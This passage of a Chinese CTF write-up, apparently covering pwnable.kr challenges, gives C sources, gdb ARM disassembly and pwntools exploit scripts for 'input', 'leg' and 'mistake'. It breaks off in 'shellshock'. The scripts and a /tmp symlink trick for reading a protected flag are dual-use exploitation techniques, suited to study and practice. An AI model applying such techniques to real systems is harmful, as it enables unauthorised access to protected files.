class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">listen(sd, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">int</span> c = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">cd = accept(sd, (struct sockaddr *)&amp;caddr, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line"><span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;accept error, tell admin\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\xde\xad\xbe\xef&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 5 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// here&#x27;s your flag</span></span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>非常麻烦的一个题，要拿到flag一共需要过5关，分别都和程序的输入输出有关，但是都可以用pwntools解决。第一关首先需要有100个argv，第一个argv是程序本身的路径，之后需要跟99个命令行参数，并且argv[65]和argv[66]分别为<code>\x00</code>和<code>\x20\x0a\x0d</code>，很简单，直接用pwntools启动程序的process函数的argv参数传递即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;/home/input2/input&quot;</span>)</span><br><span class="line">a = [elf.path] + [<span class="string">&#x27;a&#x27;</span>] * <span class="number">99</span></span><br><span class="line">a[ord(<span class="string">&#x27;A&#x27;</span>)] = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">a[ord(<span class="string">&#x27;B&#x27;</span>)] = <span class="string">&#x27;\x20\x0a\x0d&#x27;</span></span><br><span class="line">a[ord(<span class="string">&#x27;C&#x27;</span>)] = <span class="string">&#x27;7373&#x27;</span></span><br><span class="line">conn = process(argv=a)</span><br></pre></td></tr></table></figure><p>第二关程序会从标准输入和标准错误中读取，并且比较读到的是不是<code>\x00\x0a\x00\xff</code>和<code>\x00\x0a\x02\xff</code>，pwntools的process直接提供了stdin和stdout的读写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conn.sendafter(<span class="string">&#x27;Stage 1 clear!\n&#x27;</span>, <span class="string">&#x27;\x00\x0a\x00\xff&#x27;</span>)</span><br><span class="line">conn.stderr.write(<span class="string">&#x27;\x00\x0a\x02\xff&#x27;</span>)</span><br></pre></td></tr></table></figure><p>第三关程序会从环境变量<code>\xde\xad\xbe\xef</code>中读取，比较是否是<code>\xca\xfe\xba\xbe</code>，直接用process函数的env参数传递就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">env = &#123;<span class="string">&#x27;\xde\xad\xbe\xef&#x27;</span>: <span class="string">&#x27;\xca\xfe\xba\xbe&#x27;</span>&#125;</span><br><span class="line">conn = process(env=env)</span><br></pre></td></tr></table></figure><p>第四关有点特殊，需要创建一个文件名为<code>\x0a</code>的文件，并且文件内容为<code>\x00\x00\x00\x00</code>，但是题目环境目录是不可写的，不过我们可以用其他方法绕过，后面再说，先用python创建这个文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;\x0a&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">b&#x27;\x00\x00\x00\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p>最后一关是socket读写，通过argv[67]提供一个端口，向这个端口发送<code>\xde\xad\xbe\xef</code>，pwntools也可以直接做到。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r = remote(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">7373</span>)</span><br><span class="line">r.send(<span class="string">&#x27;\xde\xad\xbe\xef&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这样5关就都过了，最后的exp如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.update(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;/home/input2/input&quot;</span>)</span><br><span class="line"></span><br><span class="line">a = [elf.path] + [<span class="string">&#x27;a&#x27;</span>] * <span class="number">99</span></span><br><span class="line">a[ord(<span class="string">&#x27;A&#x27;</span>)] = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">a[ord(<span class="string">&#x27;B&#x27;</span>)] = <span class="string">&#x27;\x20\x0a\x0d&#x27;</span></span><br><span class="line">a[ord(<span class="string">&#x27;C&#x27;</span>)] = <span class="string">&#x27;7373&#x27;</span></span><br><span class="line"></span><br><span class="line">env = &#123;<span class="string">&#x27;\xde\xad\xbe\xef&#x27;</span>: <span class="string">&#x27;\xca\xfe\xba\xbe&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;\x0a&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">b&#x27;\x00\x00\x00\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn = process(env=env, argv=a)</span><br><span class="line">conn.sendafter(<span class="string">&#x27;Stage 1 clear!\n&#x27;</span>, <span class="string">&#x27;\x00\x0a\x00\xff&#x27;</span>)</span><br><span class="line">conn.stderr.write(<span class="string">&#x27;\x00\x0a\x02\xff&#x27;</span>)</span><br><span class="line">conn.recvuntil(<span class="string">&#x27;Stage 4 clear!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">7373</span>)</span><br><span class="line">r.send(<span class="string">&#x27;\xde\xad\xbe\xef&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">&#x27;Stage 5 clear!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们还有第四关的问题没有解决，就是题目环境下的目录是不可写的，而我们又需要创建文件并且可以读写该文件。tmp目录通常都是自由的，我们可以任意读写tmp目录，但是在题目下我们读取不了tmp目录下的文件，但是可以在tmp目录下创建目录，我们所创建的这个目录具有完全的读写权限，在这个目录下运行exp就没有问题了。</p><p>其实还有最后一个问题，五关都过了一个，程序是通过相对路径读取的flag，但是在tmp目录下我们并没有flag，不过我们可以通过软链接的方式将home下的flag链接到我们创建的目录即可，最终我们需要在bash下依次执行如下命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/not_exist</span><br><span class="line"><span class="built_in">cd</span> /tmp/not_exist</span><br><span class="line">ln -s /home/input2/flag .</span><br><span class="line"><span class="comment"># using scp to copy you exp to here</span></span><br><span class="line">python exp.py</span><br></pre></td></tr></table></figure><h1 id="leg-2-pt"><a href="#leg-2-pt" class="headerlink" title="leg (2 pt)"></a>leg (2 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key1</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(<span class="string">&quot;mov r3, pc\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key2</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">&quot;push&#123;r6&#125;\n&quot;</span></span><br><span class="line"><span class="string">&quot;addr6, pc, $1\n&quot;</span></span><br><span class="line"><span class="string">&quot;bxr6\n&quot;</span></span><br><span class="line"><span class="string">&quot;.code   16\n&quot;</span></span><br><span class="line"><span class="string">&quot;movr3, pc\n&quot;</span></span><br><span class="line"><span class="string">&quot;addr3, $0x4\n&quot;</span></span><br><span class="line"><span class="string">&quot;push&#123;r3&#125;\n&quot;</span></span><br><span class="line"><span class="string">&quot;pop&#123;pc&#125;\n&quot;</span></span><br><span class="line"><span class="string">&quot;.code32\n&quot;</span></span><br><span class="line"><span class="string">&quot;pop&#123;r6&#125;\n&quot;</span></span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key3</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(<span class="string">&quot;mov r3, lr\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Daddy has very strong arm! : &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line"><span class="keyword">if</span>( (key1()+key2()+key3()) == key )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Congratz!\n&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">&quot;flag&quot;</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> r = read(fd, buf, <span class="number">100</span>);</span><br><span class="line">write(<span class="number">0</span>, buf, r);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;I have strong leg :P\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>需要我们输入一个数字，这个数字为3个函数key1，key2和key3的返回值的和。这3个函数都是直接用arm汇编写的，题目也直接给了这几个函数的反汇编源码，那么直接看汇编代码就可以。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x00008d3c &lt;+0&gt;:push&#123;r4, r11, lr&#125;</span><br><span class="line">   0x00008d40 &lt;+4&gt;:addr11, sp, #8</span><br><span class="line">   0x00008d44 &lt;+8&gt;:subsp, sp, #12</span><br><span class="line">   0x00008d48 &lt;+12&gt;:movr3, #0</span><br><span class="line">   0x00008d4c &lt;+16&gt;:strr3, [r11, #-16]</span><br><span class="line">   0x00008d50 &lt;+20&gt;:ldrr0, [pc, #104]; 0x8dc0 &lt;main+132&gt;</span><br><span class="line">   0x00008d54 &lt;+24&gt;:bl0xfb6c &lt;printf&gt;</span><br><span class="line">   0x00008d58 &lt;+28&gt;:subr3, r11, #16</span><br><span class="line">   0x00008d5c &lt;+32&gt;:ldrr0, [pc, #96]; 0x8dc4 &lt;main+136&gt;</span><br><span class="line">   0x00008d60 &lt;+36&gt;:movr1, r3</span><br><span class="line">   0x00008d64 &lt;+40&gt;:bl0xfbd8 &lt;__isoc99_scanf&gt;</span><br><span class="line">   0x00008d68 &lt;+44&gt;:bl0x8cd4 &lt;key1&gt;</span><br><span class="line">   0x00008d6c &lt;+48&gt;:movr4, r0</span><br><span class="line">   0x00008d70 &lt;+52&gt;:bl0x8cf0 &lt;key2&gt;</span><br><span class="line">   0x00008d74 &lt;+56&gt;:movr3, r0</span><br><span class="line">   0x00008d78 &lt;+60&gt;:addr4, r4, r3</span><br><span class="line">   0x00008d7c &lt;+64&gt;:bl0x8d20 &lt;key3&gt;</span><br><span class="line">   0x00008d80 &lt;+68&gt;:movr3, r0</span><br><span class="line">   0x00008d84 &lt;+72&gt;:addr2, r4, r3</span><br><span class="line">   0x00008d88 &lt;+76&gt;:ldrr3, [r11, #-16]</span><br><span class="line">   0x00008d8c &lt;+80&gt;:cmpr2, r3</span><br><span class="line">   0x00008d90 &lt;+84&gt;:bne0x8da8 &lt;main+108&gt;</span><br><span class="line">   0x00008d94 &lt;+88&gt;:ldrr0, [pc, #44]; 0x8dc8 &lt;main+140&gt;</span><br><span class="line">   0x00008d98 &lt;+92&gt;:bl0x1050c &lt;puts&gt;</span><br><span class="line">   0x00008d9c &lt;+96&gt;:ldrr0, [pc, #40]; 0x8dcc &lt;main+144&gt;</span><br><span class="line">   0x00008da0 &lt;+100&gt;:bl0xf89c &lt;system&gt;</span><br><span class="line">   0x00008da4 &lt;+104&gt;:b0x8db0 &lt;main+116&gt;</span><br><span class="line">   0x00008da8 &lt;+108&gt;:ldrr0, [pc, #32]; 0x8dd0 &lt;main+148&gt;</span><br><span class="line">   0x00008dac &lt;+112&gt;:bl0x1050c &lt;puts&gt;</span><br><span class="line">   0x00008db0 &lt;+116&gt;:movr3, #0</span><br><span class="line">   0x00008db4 &lt;+120&gt;:movr0, r3</span><br><span class="line">   0x00008db8 &lt;+124&gt;:subsp, r11, #8</span><br><span class="line">   0x00008dbc &lt;+128&gt;:pop&#123;r4, r11, pc&#125;</span><br><span class="line">   0x00008dc0 &lt;+132&gt;:andeqr10, r6, r12, lsl #9</span><br><span class="line">   0x00008dc4 &lt;+136&gt;:andeqr10, r6, r12, lsr #9</span><br><span class="line">   0x00008dc8 &lt;+140&gt;:; &lt;UNDEFINED&gt; instruction: 0x0006a4b0</span><br><span class="line">   0x00008dcc &lt;+144&gt;:; &lt;UNDEFINED&gt; instruction: 0x0006a4bc</span><br><span class="line">   0x00008dd0 &lt;+148&gt;:andeqr10, r6, r4, asr #9</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key1</span><br><span class="line">Dump of assembler code for function key1:</span><br><span class="line">   0x00008cd4 &lt;+0&gt;:push&#123;r11&#125;; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cd8 &lt;+4&gt;:addr11, sp, #0</span><br><span class="line">   0x00008cdc &lt;+8&gt;:movr3, pc</span><br><span class="line">   0x00008ce0 &lt;+12&gt;:movr0, r3</span><br><span class="line">   0x00008ce4 &lt;+16&gt;:subsp, r11, #0</span><br><span class="line">   0x00008ce8 &lt;+20&gt;:pop&#123;r11&#125;; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008cec &lt;+24&gt;:bxlr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key2</span><br><span class="line">Dump of assembler code for function key2:</span><br><span class="line">   0x00008cf0 &lt;+0&gt;:push&#123;r11&#125;; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cf4 &lt;+4&gt;:addr11, sp, #0</span><br><span class="line">   0x00008cf8 &lt;+8&gt;:push&#123;r6&#125;; (str r6, [sp, #-4]!)</span><br><span class="line">   0x00008cfc &lt;+12&gt;:addr6, pc, #1</span><br><span class="line">   0x00008d00 &lt;+16&gt;:bxr6</span><br><span class="line">   0x00008d04 &lt;+20&gt;:movr3, pc</span><br><span class="line">   0x00008d06 &lt;+22&gt;:addsr3, #4</span><br><span class="line">   0x00008d08 &lt;+24&gt;:push&#123;r3&#125;</span><br><span class="line">   0x00008d0a &lt;+26&gt;:pop&#123;pc&#125;</span><br><span class="line">   0x00008d0c &lt;+28&gt;:pop&#123;r6&#125;; (ldr r6, [sp], #4)</span><br><span class="line">   0x00008d10 &lt;+32&gt;:movr0, r3</span><br><span class="line">   0x00008d14 &lt;+36&gt;:subsp, r11, #0</span><br><span class="line">   0x00008d18 &lt;+40&gt;:pop&#123;r11&#125;; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d1c &lt;+44&gt;:bxlr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key3</span><br><span class="line">Dump of assembler code for function key3:</span><br><span class="line">   0x00008d20 &lt;+0&gt;:push&#123;r11&#125;; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008d24 &lt;+4&gt;:addr11, sp, #0</span><br><span class="line">   0x00008d28 &lt;+8&gt;:movr3, lr</span><br><span class="line">   0x00008d2c &lt;+12&gt;:movr0, r3</span><br><span class="line">   0x00008d30 &lt;+16&gt;:subsp, r11, #0</span><br><span class="line">   0x00008d34 &lt;+20&gt;:pop&#123;r11&#125;; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d38 &lt;+24&gt;:bxlr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>很明显可以看到0x00008d8c处的cmp是在比较三个key函数的返回值和我们输入的数字是否相同。arm的函数返回值最终放在r0里，那么我们就需要找调用完这几个key以后r0里都是什么。首先0x00008d68调用key1，调转到0x00008cd4，我们只关注r0，r0来自r3，而r3来自pc，pc中保存的是下一条要执行的指令地址，arm的指令长度为4，pc中保存的也就是当前指令+8处的地址，所以在0x00008cdc处的pc的值应该就是0x00008ce4，所以key1的返回值为0x00008ce4。</p><p>执行完key1在回到0x00008d6c，将key1点返回值r0放入r4中，接着由执行key2，跳转到0x00008cf0。首先保存r6，然后把pc+1保存到r6中，然后跳转到r6，也就是跳转到0x00008d05，由于最低位是1，则bx跳转到0x00008d04，并且切换到thumb状态，然后将pc放入r3中，由于thumb状态指令长度为2，因此r3为0x00008d08，再加4，就变成了0x00008d0c，然后一个push一个pop把r3放入pc中，pc变成了0x00008d0c，跳转到0x00008d0c处，再pop恢复r6，然后把r3放入r0最为返回值，因此最后的返回值r0为0x00008d0c。</p><p>执行完key2后状态切换为arm态，将key2的返回值放入r3中，和key1的返回值加起来放入r4，然后跳转到key3的位置0x00008d20。key3里直接把lr放入r3，再把r3放入r0返回，而lr中保存的是key3的返回地址，也就是执行完key3要返回的地址，就是0x00008d80，因此key3的返回值为0x00008d80。这三个数加起来就是108400，也就是最后的结果。</p><h1 id="mistake-1-pt"><a href="#mistake-1-pt" class="headerlink" title="mistake (1 pt)"></a>mistake (1 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PW_LEN 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> XORKEY 1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xor</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">s[i] ^= XORKEY;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">if</span>(fd=open(<span class="string">&quot;/home/mistake/password&quot;</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;can&#x27;t open password %d\n&quot;</span>, fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;do not bruteforce...\n&quot;</span>);</span><br><span class="line">sleep(time(<span class="number">0</span>)%<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> pw_buf[PW_LEN+<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> len;</span><br><span class="line"><span class="keyword">if</span>(!(len=read(fd,pw_buf,PW_LEN) &gt; <span class="number">0</span>))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;read error\n&quot;</span>);</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> pw_buf2[PW_LEN+<span class="number">1</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;input password : &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%10s&quot;</span>, pw_buf2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// xor your input</span></span><br><span class="line"><span class="keyword">xor</span>(pw_buf2, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strncmp</span>(pw_buf, pw_buf2, PW_LEN))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Password OK\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Wrong Password\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>题目提示是运算符优先级第问题，而源码第17行又一个很明显的错误<code>fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0</code>，这里有一个连用的运算符并且没有加括号，等号的优先级通常来说是最低的，因此这行代码等价于<code>fd=(open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0)</code>，而open返回值肯定不会小于0，所以fd这时就会被赋值为0，程序后面的read用fd读取password的时候，fd是0就代表从标准输入里读取，这时候password是什么就不重要了，因为我们可以控制password的值，只要连续输入两个字符串，一个是另一个的xor版本就可以了，exp如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">s</span>):</span></span><br><span class="line">    x = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        x += chr(ord(i) ^ <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">print(xor(<span class="string">&#x27;1234567890&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先输入1234567890，然后输入0325476981，0325476981是1234567890的xor结果，这样就可以拿到flag。</p><h1 id="shellshock-1-pt"><a href="#shellshock-1-pt" class="headerlink" title="shellshock (1 pt)"></a>shellshock (1 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">setresuid(getegid(), getegid(), getegid());</span><br><span class="line">setresgid(getegid(), getegid(), getegid());</span><br><span class="line">system(<span class="string">&quot;/home/shellshock/bash -c &#x27;echo shock_me&#x27;&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span 